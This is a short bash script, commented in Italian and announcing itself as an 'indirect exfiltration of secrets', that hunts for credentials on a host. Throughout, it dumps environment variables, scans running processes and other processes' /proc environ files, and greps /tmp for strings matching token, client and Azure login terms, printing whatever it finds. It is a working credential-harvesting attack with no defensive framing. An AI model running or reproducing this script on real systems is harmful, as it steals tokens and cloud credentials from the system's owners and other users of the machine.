#!/bin/bash

echo "[*] Avvio esfiltrazione indiretta dei secrets..."

# Prova 1: dump env accessibili a questo processo
echo "[+] ENV:"
env | grep -i 'token\|client\|sub\|id'

# Prova 2: scan dei processi in esecuzione per trovare parametri CLI o env temporanei
echo "[+] Parametri processi:"
ps aux | grep -i 'azure\|login\|token\|client'

# Prova 3: accesso ai file ambientali di processi in esecuzione
echo "[+] Dump ambienti di altri processi:"
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  if [ -r /proc/$pid/environ ]; then
    strings /proc/$pid/environ | grep -i 'token\|client\|sub\|id'
  fi
done

# Prova 4: brute-force comuni file temporanei
echo "[+] File temporanei:"
grep -iR 'token\|client' /tmp 2>/dev/null || true
